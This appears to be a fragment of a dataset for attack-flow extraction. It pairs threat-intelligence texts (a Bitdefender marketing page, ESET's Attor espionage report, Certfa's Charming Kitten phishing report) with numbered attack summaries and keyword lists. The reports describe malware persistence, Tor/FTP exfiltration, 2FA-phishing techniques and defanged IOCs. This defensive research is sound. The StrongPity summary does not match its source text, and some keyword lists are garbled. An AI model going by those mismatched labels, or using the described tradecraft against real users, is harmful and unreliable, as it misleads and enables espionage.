14:11 10/10/19 10:41 10/10/19 10:48 10/10/19 10:52 10/10/19 10:55 10/10/19 11:20 11/4/19 13:57 11/4/19 14:00 11/4/19 14:10 11/4/19 14:22 11/4/19 14:28 11/4/19 14:41 11/4/19 15:04 11/4/19 15:12 11/4/19 15:19 11/28/19 8:22 11/28/19 8:22 12/12/19 7:31 12/12/19 7:31 12/12/19 7:38 12/12/19 8:31 12/12/19 8:47 12/12/19 8:54 12/12/19 9:42 12/12/19 9:42 12/12/19 9:43 12/12/19 9:49 12/12/19 10:06 12/12/19 10:15 12/12/19 10:24 1/23/20 9:50 1/23/20 10:04 1/23/20 11:24Hash v16_kt32p5_252657306615Why BitdefenderProudly Serving Our Customers Bitdefender provides solutions and services for small business and medium enterprises, service providers and technology integrators. We take pride in the trust that enterprises such as Mentor, Honeywell, Yamaha, Speedway, Esurance or Safe Systems place in us.Dedicated To Our +20.000 Worldwide Partners A channel-exclusive vendor, Bitdefender is proud to share success with tens of thousands of resellers and distributors worldwide.CRN 5-Star Partner, 4th Year in a Row. Recognized on CRN’s Security 100 List. CRN Cloud Partner, 2nd year in a RowLeader in Forrester’s inaugural Wave™ for Cloud Workload SecurityNSS Labs “Recommended” Rating in the NSS Labs AEP Group TestSC Media Industry Innovator Award for Hypervisor Introspection, 2nd Year in a RowGartner® Representative Vendor of Cloud-Workload Protection PlatformsMore MSP-integrated solutions than any other security vendor3 Bitdefender Partner Programs - to enable all our partners – resellers, service providers and hybrid partners – to focus on selling Bitdefender solutions that match their own specializationsTrusted Security Authority Bitdefender is a proud technology alliance partner to major virtualization vendors, directly contributing to the development of secure ecosystems with VMware, Nutanix, Citrix, Linux Foundation, Microsoft, AWS, and Pivotal.Through its leading forensics team, Bitdefender is also actively engaged in countering international cybercrime together with major law enforcement agencies such as FBI and Europol, in initiatives such as NoMoreRansom and TechAccord, as well as the takedown of black markets such as Hansa. Starting in 2019, Bitdefender is also a proudly appointed CVE Numbering Authority in MITRE Partnership.RECOGNIZED BY LEADING ANALYSTS AND INDEPENDENT TESTING ORGANIZATIONSTECHNOLOGY ALLIANCESN ","1. StrongPity compromises software download websites using watering hole attacks. 2. The sites are modified to redirect targeted victims to malicious StrongPity servers when trying to download certain software installers. 3. The servers check the victim's IP address against a predefined list. If the IP is on the list, a trojanized version of the software installer containing malware is served. 4. The trojanized installer contains encrypted malicious components signed with a self-signed certificate to appear legitimate. 5. When executed, the installer drops multiple components on the victim system including persistence, command execution, and document exfiltration modules. 6. The command execution component connects to a multi-layered command and control infrastructure set up by StrongPity. 7. The C2 issues commands to extract documents from the infected system based on file extensions. 8. A file searcher component searches drives and archives identified files. 9. The files are encrypted and exfiltrated via the C2 channel to StrongPity servers. 10. The multi-layered C2 infrastructure hides the identity of the final StrongPity servers receiving the exfiltrated documents. ",valid_54,"['StrongPity', 'Download', 'attacks', 'targeted victims', 'the servers', 'the victim', 'the IP', 'Trojanized', 'malware', 'malicious components', 'a self-signed certificate', 'persistence', 'command execution', 'document exfiltration', 'control', 'infrastructure', 'C2', 'commands', 'documents', 'a file', 'the files', '10']",StrongPity; Download; attacks; targeted victims; the servers; the victim; the IP; Trojanized; malware; malicious components; a self-signed certificate; persistence; command execution; document exfiltration; control; infrastructure; C2; commands; documents; a file; the files; 10.
"ESET discovers Attor, a spy platform with curious GSM ﬁngerprintingwelivesecurity.com/2019/10/10/eset-discovers-attor-spy-platformOctober 10, 2019ESET researchers discover a previously unreported cyberespionage platform used in targeted attacks against diplomatic missions and governmental institutions, and privacy-concerned usersZuzana Hromcová 10 Oct 2019 - 11:30AM ESET researchers have discovered a new espionage platform with a complex architecture, a host of measures to make detection and analysis more difﬁcult and two notable features. First, its GSM plugin uses the AT command protocol, and second, it uses Tor for its network communications. ESET researchers thus named the cyberespionage platform Attor. Targets Attor’s espionage operation is highly targeted – we were able to trace Attor’s operation back to at least 2013, yet we only identiﬁed a few dozen victims. Despite that, we were able to learn more about the intended victims by analyzing artifacts in the malware.For example, in order to be able to report on the victim’s activities, Attor monitors active processes to take screenshots of selected applications. Only certain applications are targeted – those with speciﬁc substrings in the process name or window title.Besides standard services such as popular web browsers, instant messaging applications and email services, the list of targeted applications contains several Russian services, as detailed in Table 1.Table 1. Domains misused in the campaign Process name/window title substringОДНОКЛАССНИКИ (transl. Classmates)AGENTVKONTAKTEWEBMONEYContextRussian social network (Odnoklass‐ niki)Russian social network (VKontakte)Online payment system used in Russia (WebMoney)MAIL.YANDEX, ЯНДЕКС.ПОЧТА (transl. Yandex.Mail), MAIL.RU, POCHTA (transl. Mail), MAGENTRussian email services (Mail.ru, Yandex.Mail)ПРИГЛАШЕНИЕ ДРУЖИТЬ (transl. Friend request)ВАМ СООБЩЕНИЕ (transl. Message for you)MULTIFONRussian textRussian textRussian VoIP serviceurl discovers Attor, a spy platform with curious GSM ﬁngerprinting | WeLiveSecurityTable 1. Domains misused in the campaignQIP, INFIUMRAMBLERRussian IM application (QIP)Russian search engine (Rambler)The list includes the two most popular social networks in Russia (Odnoklassniki, VKontakte) and a VoIP service provided by a Russian telecom operator (Multifon). Our conclusion is that Attor is speciﬁcally targeting Russian-speakers, which is further supported by the fact that most of the targets are located in Russia, as seen in Figure 1. Other targets are located in Eastern Europe, and they include diplomatic missions and governmental institutions.Figure 1. Countries affected by AttorIn addition to its geographical and language targeting, Attor’s creators appear to be speciﬁcally interested in users concerned about their privacy.Attor is conﬁgured to capture screenshots of encryption/digital signature utilities, the VPN service HMA, end‑to‑end encryption email services Hushmail and The Bat!, and the disk encryption utility TrueCrypt.The victim’s usage of TrueCrypt is further inspected in another part of Attor. It monitors hard disk devices connected to the compromised computer, and searches for the presence of TrueCrypt. If TrueCrypt is detected, its version is determined by sending IOCTLs to the TrueCrypt driver (0x222004 (TC_IOCTL_GET_DRIVER_VERSION) and 0x72018 (TC_IOCTL_LEGACY_GET_DRIVER_VERSION)). As these are TrueCrypt-speciﬁc controlurl discovers Attor, a spy platform with curious GSM ﬁngerprinting | WeLiveSecuritycodes, not standard codes, the authors of the malware must actually understand the open-source code of TrueCrypt installer. We have not seen this technique used before nor seen it documented in other malware.Figure 2. The Device monitor plugin sends non-standard, TrueCrypt-speciﬁc control codes to the TrueCrypt driver, in order todetermine the TrueCrypt versionPlatform architecture Attor consists of a dispatcher and loadable plugins, all of which are implemented as dynamic-link libraries (DLLs). The ﬁrst step of a compromise comprises dropping all these components on disk and loading the dispatcher DLL.url discovers Attor, a spy platform with curious GSM ﬁngerprinting | WeLiveSecurityThe dispatcher is the core of the whole platform – it serves as a management and synchronization unit for the additional plugins. On each system start, it injects itself into almost all running processes and loads all available plugins within each of these processes. As an exception, Attor avoids injection into some system and security‑product‑related processes.All plugins rely on the dispatcher for implementing basic functionalities. Rather than calling Windows API functions directly, the plugins use a reference to a helper function (a function dispatcher) implemented by the dispatcher DLL. A reference to the function dispatcher is passed to the plugins when they are loaded. Because the plugins are injected in the same process as the dispatcher itself, they share the same address space and are thus able to call this function directly.Calls to the function dispatcher take as their arguments the function type and its numerical identiﬁer. This design makes it harder to analyze individual components of Attor without having access to the dispatcher, as it translates the speciﬁed identiﬁer to a meaningful function that is then executed.Figure 3 illustrates a part of one plugin, calling the function dispatcher on several occasions. In the disassembly on the right, we have replaced the numeric identiﬁers (that we recovered by reverse-engineering the dispatcher) with descriptive names. Refer to our white paper for a full analysis of the dispatcher’s interface.url discovers Attor, a spy platform with curious GSM ﬁngerprinting | WeLiveSecurityFigure 3. Additional plugins use functions implemented in the main module, by calling the function dispatcher (dubbedhelperFnc here)Furthermore, the dispatcher is the only component of the platform that has access to the conﬁguration data. Attor’s plugins retrieve their conﬁguration data from the dispatcher via the interface, as described above. Plugins Attor’s plugins are delivered to the compromised computer as DLLs, asymmetrically encrypted with RSA. The plugins are only fully recovered in memory, using the public RSA key embedded in the dispatcher. As a result, it is difﬁcult to obtain Attor’s plugins, and to decrypt them, without access to the dispatcher.url discovers Attor, a spy platform with curious GSM ﬁngerprinting | WeLiveSecurityWe were able to recover eight of Attor’s plugins, some in multiple versions – we list them in Table 2. Assuming the numbering of plugins is continuous, and that actors behind Attor may use different sets of plugins on a per‑victim basis, we suspect there are even more plugins that have not yet been discovered.Table 2. The analyzed plugins and their versions Plugin ID Analyzed versions0x0E(no version), 0x0C0x010x020x030x050x060x070x0D0x10FunctionalityDevice monitorScreengrabber(no version), 0x08, 0x09, 0x0B, 0x0C Audio recorder0x0A0x0AFile uploaderCommand dispatcher/SOCKS proxy0x02, 0x04, 0x09, 0x0AKey/clipboard logger0x030x01Tor clientInstaller/watchdogThe plugins are responsible for persistence of the platform (Installer/watchdog plugin), for collecting sensitive information (Device monitor, Screengrabber, Audio recorder, Key/clipboard logger) and for network communication with the C&C server (File uploader, Command dispatcher/SOCKS proxy, Tor client).Attor has built-in mechanisms for adding new plugins, for updating itself, and for automatically exﬁltrating collected data and log ﬁles. These mechanisms are illustrated in Figure 4.In the following sections, we focus on plugins responsible for the two notable features that gave Attor its name – GSM ﬁngerprinting via AT commands, and elaborate network communication using Tor.url discovers Attor, a spy platform with curious GSM ﬁngerprinting | WeLiveSecurityFigure 4. Attor’s architecture. Note that ID 0x06 represents a single plugin, but the functionality is split here into two parts forclarity.Network communication Attor’s espionage plugins collect sensitive data (such as a list of documents present on the disk) that are ultimately exﬁltrated to a remote server, but these plugins themselves do not communicate over the network.Only two of Attor’s components communicate with its C&C server: File uploader and Command dispatcher.Files collected by the “espionage plugins” (Device monitor, Screengrabber, Audio recorder, and Key/clipboard logger) are uploaded to the C&C server automatically by the File uploader plugin. These plugins use a dedicated Upload folder as a central folder to store collected data, and other plugins use it to store log ﬁles.The Command dispatcher plugin downloads commands and additional tools from the C&C server and interprets them. Again, it uses dedicated folders to store its data – most prominently, freshly downloaded plugins and platform updates, and encrypted log data containing status/results of the executed commands.Attor’s dispatcher monitors the shared folders, and loads any new plugins and updates pushed to the compromised computer.This means that neither Attor’s dispatcher, nor espionage plugins, ever communicate with the C&C server – they only use local shared folders for storing data to be exﬁltrated and for reading further instructions from the server.url discovers Attor, a spy platform with curious GSM ﬁngerprinting | WeLiveSecurityBoth File uploader, and Command dispatcher use the same infrastructure to reach the remote server – the network communication itself is scattered across four different Attor components, each implementing a different layer.Attor uses Tor: Onion Service Protocol, with an onion address for the C&C server. In order to communicate with the C&C server, any plugin must thus ﬁrst establish a connection with the Tor onion domain, choosing a circuit and encrypting data in layers. The Tor client plugin is based on the Tor client, and customized to the design of this malware (tor.exe with added interaction with Attor’s dispatcher).The Tor client plugin must communicate with the dispatcher, which implements the cryptographic functions. Furthermore, it communicates with the SOCKS proxy plugin (listening on FTP server that is protected by credentials hardcoded in the conﬁguration:C&C server: idayqh3zhj5j243t[.]onion Username: do Password: [Redacted]The plugins log in to the FTP server and copy the collected data to, or download commands from, a victim‑speciﬁc directory.In total, the infrastructure for C&C communication spans four Attor components – the dispatcher providing encryption functions, and three plugins implementing the FTP protocol, the Tor functionality and the actual network communication, as illustrated in Figure 5. This mechanism makes it impossible to analyze Attor’s network communication unless all pieces of the puzzle have been collected.url discovers Attor, a spy platform with curious GSM ﬁngerprinting | WeLiveSecurityFigure 5. Four Attor components cooperate to enable communication with the C&C serverIt is important to note that Attor uses several additional tricks to hide its communications from the user and security products:First, the C&C server is a Tor service, aiming for anonymity and untraceability.Second, all network-communication-related plugins are only activated if running within the process of a web browser or an instant messaging application or other network applications (this is determined by checking the process name against a hardcoded list). This trick hides the exﬁltration-related network communication in a stream of legitimate communications made by that application, and thus reduces the risk of raising any suspicion.url discovers Attor, a spy platform with curious GSM ﬁngerprinting | WeLiveSecurityGSM ﬁngerprinting The most curious plugin in Attor’s arsenal collects information about both connected modem/phone devices and connected storage drives, and about ﬁles present on these drives. It is responsible for collection of metadata, not the ﬁles themselves, so we consider it a plugin used for device ﬁngerprinting, and hence likely used as a base for further data theft.While Attor’s functionality of ﬁngerprinting storage drives is rather standard, its ﬁngerprinting of GSM devices is unique.Whenever a modem or a phone device is connected to a COM port, Device monitor uses AT commands to communicate with the device, via the associated serial port.AT commands, also known as Hayes command set, were originally developed in the 1980s to command a modem to dial, hang up or change connection settings. The command set was subsequently extended to support additional functionality, both standardized and vendor-speciﬁc.In a recent paper, it was discovered that the commands are still in use in most modern smartphones. Those researchers were able to bypass security mechanisms and communicate with smartphones using AT commands through their USB interface. Thousands of commands were recovered and tested, including those to send SMS messages, emulate on-screen touch events, or leak sensitive information. That research illustrates that the old‑school AT commands pose a serious risk when misused.As for Attor’s plugin, however, we may only speculate why AT commands are employed. We have detected a 64‑bit version of this plugin in 2019, and we can conﬁrm it is still a part of the newest Attor version (that we ﬁrst saw in 2018). On the other hand, it seems unlikely it is targeting modern smartphone devices. The plugin ignores devices connected via a USB port, and only contacts those connected via a serial port (more precisely, devices whose friendly names match “COM*”).A more likely explanation of the plugin’s main motive is that it targets modems and older phones. Alternatively, it may be used to communicate with some speciﬁc devices (used by the victim or target organization) that are connected to the COM port or to the USB port using a USB-to-serial adaptor. In this scenario, it is possible the attackers have learned about the victim’s use of these devices using some other reconnaissance techniques.In any case, the plugin retrieves the following information from the connected devices, using the AT commands listed in Table 3:Basic information about the mobile phone or GSM/GPRS modem: name of manufacturer, model number, IMEI number and software version Basic information about the subscriber: MSISDN and IMSI numberTable 3. The commands of the AT protocol used by the Device monitor plugin AT com‐ mandFunctionalityATSignals start of communication (AT for attention).AT+MODE=2 Prepares the phone for an extended AT+ command set.url discovers Attor, a spy platform with curious GSM ﬁngerprinting | WeLiveSecurityTable 3. The commands of the AT protocol used by the Device monitor pluginAT+CGSNRequests IMEI number (International Mobile Equipment Identity), which is a unique number to identify a device.AT+CGMMRequests information about the model of the device (model number).AT+CGMIRequests name of the device manufacturer.AT+CGMRRequests the version of the software loaded on the device.AT+CNUMAT+CIMIRequests MSISDN (Mobile Station International Subscriber Directory Number), which is the mapping of the telephone number to the subscriber identity module in a mobile or cellular phone.Requests IMSI (International Mobile Subscriber Identity), which is a unique number identify‐ ing a GSM subscriber. This number has two parts. The initial part is comprised of six digits in the North American standard and ﬁve digits in the European standard. It identiﬁes the GSM network operator in a speciﬁc country with whom the subscriber holds an account. The sec‐ ond part is allocated by the network operator to identify the subscriber uniquely.Note that many more (vendor-speciﬁc) AT commands exist that are not used by this plugin. It is possible that the malware operators use the listed commands to ﬁngerprint the connected devices, and then deploy another plugin with more speciﬁc commands to extract information from Attor is an espionage platform, used for highly targeted attacks against high-proﬁle users in Eastern Europe, and Russian-speaking, security-concerned users.The malware, which has ﬂown under the radar since 2013, has a loadable-plugin architecture that can be used to customize the functionality to speciﬁc victims. It includes an unusual plugin for GSM ﬁngerprinting that utilizes the rarely used AT command set, and incorporates Tor with the aim of anonymity and untraceability.Our research provides a deep insight into the malware and suggests that it is well worth further tracking of the operations of the group behind it.ESET detection names and other Indicators of Compromise for these campaigns can be found in the full white paper: AT commands, TOR-based communications: Meet Attor, a fantasy creature and also a spy platform.Acknowledgements to Anton Cherepanov, Peter Košinár, and Zoltán Rusnák for their work on this investigation. MITRE ATT&CK techniquesTactic Attor’s dispatcher uses CreateProcessW API for execution.url discovers Attor, a spy platform with curious GSM ﬁngerprinting | WeLiveSecurityTacticIDNameDescriptionT1129Execution LoadAttor’s dispatcher executes additional plugins by loading the respective DLLs.T1085 Rundll32Plugin 0x10 schedules rundll32.exe to load the dispatcher.T1053 ScheduledTaskPlugin 0x10 schedules rundll32.exe to be executed on each boot/logon, and subsequently to load the dispatcher.T1035 ServiceExecutionT1037Logon tenceAttor’s dispatcher can be executed as a service.Attor’s dispatcher can establish persistence via adding a Registry key with a logon script: HKEY_CURRENT_USER\Environment""UserInitMprLogon‐ Script"".T1050 New Service Attor’s dispatcher can establish persistence by registering a new service. HKEY_LOCAL_MACHINE\SYSTEM\*ControlSet*\Control\SafeBoot\Mini‐ mal registry keys are updated to execute the service even in Safe mode and Safe mode with networking.T1053 ScheduledTaskDe‐ InformationPlugin 0x10 schedules a new task that loads the dispatcher on boot/logon.Strings are encrypted with a XOR cipher, using a hardcoded key. Conﬁguration data, log ﬁles and plugins are encrypted using a hybrid en‐ cryption scheme – Blowﬁsh-OFB combined with RSA.T1107File DeletionThe collected ﬁles and log ﬁles are deleted after exﬁltration by plugin 0x05.T1158 Hidden Files and DirectoriesThe attributes of log ﬁles and directories are set to HIDDEN/SYSTEM/AR‐ CHIVE (or combination of those).T1036 Masquerad‐ingAttor’s dispatcher disguises itself as a legitimate task (i.e., the task name and description appear legitimate).T1112 Modify RegistryT1055 Process InjectionT1108 RedundantAccessAttor’s dispatcher can modify the Run registry key.Attor’s dispatcher injects itself into running processes, to gain higher privi‐ leges and to evade detection. It avoids speciﬁc system and Symantec processes.Both 32-bit and 64-bit versions of Attor’s dispatcher are executed; also they are injected into almost all processes. There is a watchdog component, implemented in the dispatcher or as a separate plugin, that reinstalls Attor if it has been removed.T1099TimestompThe time of last access to ﬁles and registry keys is manipulated after they have been created/modiﬁed.T1497 Virtualiza‐ tion/Sand‐ box EvasionAttor can detect whether it is executed in some virtualized or emulated en‐ vironments. If detected, it terminates itself immediately.url discovers Attor, a spy platform with curious GSM ﬁngerprinting | WeLiveSecurityTacticIDCre‐ CaptureFile and Di‐ DiscoveryT1082 System In‐ DataDescriptionUser credentials can be collected by plugin 0x07 via capturing keystrokes.Plugin 0x01 enumerates ﬁles with speciﬁc extensions on all hard disk dri‐ ves and stores ﬁle information in encrypted log ﬁles.Plugin 0x01 collects information about inserted storage devices, modems and phone devices.Attor monitors the free disk space on the system.Plugin 0x03 is capable of recording audio using available input sound devices.Attor automatically collects data about the compromised system.Plugin 0x07 collects data stored in the Windows clipboard by using the OpenClipboard and GetClipboardData APIs.T1074 Data Staged Collected data is staged in a central upload directory prior to exﬁltration.T1056T1113Input CaptureScreen CapturePlugin 0x07 captures keystrokes pressed within the window of the process where Attor is injected.Plugin 0x02 captures screenshots of target applications.Com‐ Used PortT1188 Multi-hopProxyAttor uses port 21 for C&C communication.Attor uses Tor for C&C communication.T1079 Multilayer EncryptionAttor sends encrypted trafﬁc using Tor, which itself uses multiple layers of encryption.T1105 Remote FileCopyT1071 StandardApplication ProtocolAttor can download additional plugins, updates and other ﬁles.FTP protocol is used for C&C communication.A combination of Blowﬁsh-OFB and RSA is used for data encryption.Exﬁl‐ trationT1020 Automated ExﬁltrationExﬁltration of the collected data and log ﬁles is done automatically by plug‐ in 0x05.T1022 DataEncryptedAttor encrypts data with a combination of Blowﬁsh and RSA ciphers before sending it to the C&C server.url discovers Attor, a spy platform with curious GSM ﬁngerprinting | WeLiveSecurityTacticIDNameDescriptionAttor exﬁltrates data over the C&C channel.T1041 Exﬁltration ChannelZuzana Hromcová 10 Oct 2019 - 11:30AMurl "," 1. Initial compromise via spearphishing or other vectors. Attor components deployed. 2. Dispatcher injects into processes and loads espionage modules. 3. Modules gather data from systems, devices, and user activities. 4. Data staged locally and exfiltrated over Tor using FTP. 5. C2 server pushes updates, new modules, and commands. 6. Continued monitoring and data theft moves attack into long-term espionage. ",valid_20,"['Compromise', 'Attor components', 'Dispatcher injects', 'processes', 'loads', 'data', 'devices', 'use', 'FTP', 'updates', 'commands', 'ves', 'attack']",Compromise; Attor components; Dispatcher injects; processes; loads; data; devices; use; FTP; updates; commands; ves; attack.
"The Return of The Charming Kittenblog.certfa.com/posts/the-return-of-the-charming-kitten/A review of the latest wave of organized phishing attacks by Iranian state- backed hackersCertfa Lab · 2018.12.13A review of the latest wave of organized phishing attacks by Iranian state-backed hackersAbstract Phishing attacks are the most common form of infiltration used by Iranian state-backed hackers to gain access into accounts. Certfa reviews the latest campaign of phishing attacks that has been carried out and dubbed as “The Return of The Charming Kitten”.In this campaign, hackers have targeted individuals who are involved in economic and military sanctions against the Islamic Republic of Iran as well as politicians, civil and human rights activists and journalists around the world.Our review in Certfa demonstrates that the hackers - knowing that their victims use two- step verification - target verification codes and also their email accounts such as Yahoo! and Gmail. As a result, Certfa believes the safest existing way to confront these attacks is using Security Keys such as YubiKey.Introduction In early October 2018, MD0ugh, a Twitter user , revealed phishing attacks of a group of Iranian hackers against US financial institution infrastructure. According to this user, these attacks could possibly be a reaction to new sanctions against Iran.1The account mentioned a domain with the address accounts[-]support[.]services for the first time. This domain is linked to a group of hackers who are supported by the Iranian government, and that we believe have close ties with the Islamic Revolutionary Guard Corps (IRGC). ClearSky has previously published detailed reports on their activities.2A month after these attacks, the administrators of accounts-support[.]services expanded their activities and started targeting civil and human rights activists, political figures and also Iranian and Western journalists.Methods of Attacks1/8Our investigation illustrates that the attackers are utilising different methods to carry out their attacks. These methods can be put into two categories:1. Phishing attacks through unknown email or social media and messaging accounts 2. Phishing attacks through email or social media and messaging accounts of publicfigures, which have been hacked by the attackersWe have also found that the hackers have collected information on their targets prior to the phishing attack. The hackers design specific plans for each target based on the level of targets’ cyber knowledge, their contacts, activities, working time, and their geographic situation.We also noticed that, unlike in previous phishing campaigns, in some cases the hackers did not change the password of their victims’ accounts in these latest attacks. This allows them to remain undetected and monitor a victim’s communications via their email in real time.Fake alerts of unauthorised access According to the samples of phishing attacks, the main trick used by these hackers to deceive their targets is that of sending fake alerts through email addresses such as notifications.mailservices@gmail[.]com, noreply.customermails@gmail[.]com, customer]email-delivery[.]info etc. stating that unauthorised individuals have tried to access their accounts.Figure1. Illustration of safe and secure looking fake linksFigure1. Illustration of safe and secure looking fake links By using this method, attackers pretend that the email provider has sent security alerts to the targets and they should immediately review and restrict suspicious accesses. More details are available in the “Destination Link” section.Fake file sharing on Google Drive Sending links with titles such as share files from Google Drive has been one of the most common tricks that hackers have used in recent years. A unique point of these attacks in comparison with the previous ones is that they use Google Site , which allows the hackers to show a fake download page of Google Drive, which tricks the users into thinking it’s a real Google Drive page.3Figure 2. A fake page of Google Drive file sharing pageFigure 2. A fake page of Google Drive file sharing page For example, the hacker had used hxxps://sites.google[.]com/view/sharingdrivesystem to deceive the users and convince them the page is the authentic Google Drive as users can see google.com in the address bar of their browsers. Certfa has reported this link and similar links to Google and Google has now terminated them.2/8By creating websites with the same design and look of Google Drive file sharing page, hackers pretend to be sharing a file with the user, which they should download and run it on their devices. They use hacked Twitter, Facebook and Telegram accounts to send these links and target new users. The truth is there is not any file and the hackers use this page to direct their targets to the fake Google login page, which the users enter their credential details including 2 factor authentication.The Attack Structure Most of these attacks are currently occurring through phishing emails. As a result, it would be useful to take a look the original content in recent phishing campaigns.Figure 3. An example of codes of phishing email sent to the userFigure 3. An example of codes of phishing email sent to the user1. Destination link 1.1. Trusted Stage: Internet users around the world consider Google’s main domain (google.com) to be a safe and secure address. The attackers misuse this fact and create fake pages on sites.google.com (which is a subdomain of Google) to deceive their targets. Google’s Site service gives its users an ability to show various contents on it. The attackers use this ability to send fake alerts and redirect their targets to insecure websites or embedded phishing pages as a iframe on those pages.Figure 4. How attackers misuse site.google.comFigure 4. How attackers misuse site.google.com 1.2. Untrusted Stage: Since Google can quickly recognise and eliminate suspicious and malicious links on sites.google.com, the hackers use their own website. The links of phishing websites have similar patterns to a previous phishing campaign which was launched in the past years. For example, attackers use words such as “management”, “customize”, “service”, “identification”, “session”, “confirm” etc. in the domains name and phishing URLs to deceive users who want to verify their website addresses.2. Clickable image in emails The hackers use an image, instead of texts, in the body of their emails, to bypass Google’s security and anti-phishing system. For this purpose, attackers have also used third party services such as Firefox Screenshot to host their email images.4Figure 5. An example of a planted image of fake alarm in a phishing emailFigure 5. An example of a planted image of fake alarm in a phishing email3. Hidden tracking image on emails3/8The attackers use a separate hidden image in the body of the email to notify them when their targets open the email. This trick helps the hackers to act immediately after the target opens the email and clicks on the phishing link.Phishing Pages Apart from the content structure of the emails and phishing links, we are sure that attackers use a customized platform to create and store users’ credential details. We have also noticed that they have designed the phishing pages for both desktop and mobile versions of Google and Yahoo! mail services and they might use other services in the future.An interesting technique they have used in recent attacks was once their target enters their username and password, attackers check those credentials on-the-fly and if that information was given correctly, they then ask for 2-step verification code.In other words, they check victims’ usernames and passwords in realtime on their own servers, and even if 2 factor authentication such as text message, authenticator app or one-tap login are enabled they can trick targets and steal that information too.Figures 6 to 9 demonstrate some examples of the phishing pages, which have been sent to the targets by the Iranian hackers.Figure 6. A fake page for entering password of Gmail accountsFigure 6. A fake page for entering password of Gmail accountsFigure 7. A fake page for entering 2-step verification code for Gmail accountsFigure 7. A fake page for entering 2-step verification code for Gmail accountsFigure 8. A fake page for entering password of Yahoo! accountsFigure 8. A fake page for entering password of Yahoo! accountsFigure 9. A fake page for entering 2-step verification code for Yahoo! accountsFigure 9. A fake page for entering 2-step verification code for Yahoo! accountsHacker’s Footprints Our primary reviews of the phishing websites linked to this campaign show that hackers have set up a remarkable number of domains. Our latest findings show that for this phishing campaign in a relatively short period of time, (September to November 2018), they have used more than 20 domain names. The number of phishing domains has increased at the time of writing this report. Closer investigation of these servers revealed how their network of domain names have been used in recent attacks.4/8Figure 10. Deep data of the attackers’ network in this phishing campaign, which 5 gathered by Certfa Moreover, our technical reviews reveal that the individuals, who are involved in this campaign used Virtual Private Networks (VPNs) and proxies with Dutch and French IP addresses to hide their original location. In spite of their efforts, we have uncovered enough evidence to prove that the attackers were using their real IP addresses (i.e 89.198.179[.]103 and 31.2.213[.]18 from Iran during the preparation phase of their campaign).Also, some domain names and servers of this campaign are very similar to the methods, techniques and targets that been used by Charming Kitten, a group of hackers who are linked to the Iranian government. Consequently, we believe Charming Kitten and the Iranian hacker(s) belonging to this group have returned and launched new cyber attacks against various people around the world and with more focus on Israeli and American citizens.Conclusion Phishing attacks are the most popular method of stealing data and hacking account amongst Iranian hackers, but the most significant fact about this campaign is its timing. This campaign launched weeks before 4 November 2018 which is when the U.S. imposed new sanctions on Iran. This campaign tries to collect information by infiltrating the accounts of non-Iranian political figures and authorities who work on economic and military sanctions against Iran.In other words, hackers who are supported by the Iranian government pick their targets according to policies and international interests for the Iranian government and also where Iran wants to have impact indirectly.A a result, we propose a series of recommendations to tech companies, policymakers, civil society actors and internet users to effectively lessen the threat of this type of attack and even thwart them.Our recommendations to tech companies and policy makers:Stop using 2 factor authentication by text plain message/SMS. Start using Security Keys (i.e. YubiKey) for 2 factor authentication for high ranking individuals who have sensitive jobs or activities. Do not use one-tap login verification process.Our recommendations to civil society and the Iranian diaspora media:Inform employees and colleagues about any phishing threats and encourage them to use Security Keys such as Yubikey for 2 factor authentication and activate Google’s Advanced Protection Program. Always use company and institution email accounts instead of personal email for sensitive communications. Change Sender Policy Framework or SPF settings according to the communication policy of the company/organisation such as restricting receiving emails from outside of the working network. For example, G Suite allows admins to block receiving emails from unauthorised address or675/87 domains . Encourage the public to enable 2 factor authentication on their account by mobile apps such as Google Authenticator.Our recommendations to users:Do not click on unknown links. For reviewing suspicious activities on your account or change the password, instead of clicking on any link, you can go to your “My Account” settings from your email directly which is more safer. Use email encryption such PGP for sensitive emails which prevent hackers reading your emails in the first place. Do not store classified and sensitive information as a plain text in your mailbox. HTTPS being before a domain names in a URL does not mean that the content of a website is secure or trusted - it’s just a secure extension of the HTTP protocol. Do not forget many phishing websites are currently operating under HTTPS protocol too.IOCs178.162.132[.]65 190.2.154[.]34 190.2.154[.]35 190.2.154[.]36 190.2.154[.]38 46.166.151[.]211 51.38.87[.]64 51.38.87[.]65 51.68.185[.]96 51.38.107[.]113 95.211.189[.]45 95.211.189[.]46 95.211.189[.]47 213.227.139[.]148 54.37.241[.]221 54.38.144[.]250 54.38.144[.]251 54.38.144[.]252 85.17.127[.]172 85.17.127[.]173 85.17.127[.]174 85.17.127[.]175 89.198.179[.]103 31.2.213[.]18 accounts-support[.]services broadcast-news[.]info broadcastnews[.]pro com-identifier-servicelog[.]info6/8com-identifier-servicelog[.]name com-identifier-userservicelog[.]com confirm-session-identification[.]info confirm-session-identifier[.]info confirmation-service[.]info customer-recovery[.]info customize-identity[.]info document-share[.]info document.support-recoverycustomers[.]services documentofficupdate[.]info documents.accounts-support[.]services documentsfilesharing[.]cloud email-delivery[.]info mobile-sessionid.customize-identity[.]info mobiles-sessionid.customize-identity[.]info my-scribdinc[.]online myyahoo.ddns[.]net notificationapp[.]info onlinemessenger.com-identifier-servicelog[.]name session-management[.]info support-recoverycustomers[.]services continue-session-identifier[.]info mobilecontinue[.]network session-identifier-webservice.mobilecontinue[.]network com-messengersaccount[.]name invitation-to-messenger[.]space confirm-identification[.]name mobilecontinue[.]network mobile.confirm-identification[.]name services.confirm-identification[.]name mobile-messengerplus[.]network confirm.mobile-messengerplus[.]network com-messengercenters[.]name securemail.mobile-messengerplus[.]network documents.mobile-messengerplus[.]network confirm-identity[.]net identifier-sessions-mailactivityid[.]site activatecodeoption.ddns[.]net broadcastpopuer.ddns[.]net books.com-identifier-servicelog[.]name mb.sessions-identifier-memberemailid[.]network sessions-identifier-memberemailid[.]network sessions.mobile-messengerplus[.]network confirm-verification-process[.]systems7/8accounts.confirm-verification-process[.]systems broadcastnews.ddns[.]net account-profile-users[.]info us2-mail-login-profile[.]site us2.login-users-account[.]site login-users-account[.]site live.account-profile-users[.]info signin.account-profile-users[.]info aol.account-profile-users[.]info users-account[.]siteFootnotes:1. url url url ⇆2. ClearSkye Cyber Security (2018), “Charming Kitten, Iranian cyber espionage againsthuman rights activists, academic researchers and media outlets - and the HBO hacker connection”. Accessed November 15, 2018. url ⇆3. Sites. Accessed November 23, 2018. url ⇆ 4. Firefox Screenshots. Accessed November 15, 2018. url⇆5. VirusTotal Graph. Accessed November 25, 2018. url ⇆ 6. Sender Policy Framework or SPF is an email authentication method to detect forged sender addresses in emails. SPF allows the recipient to check that an email claiming to come from a specific domain comes from an IP address authorized by that domain’s administrators. ⇆7. G Suite Administrator Help (2018), “Restrict messages to authorized addresses ordomains”. Accessed November 29, 2018. url ⇆8/8 "," 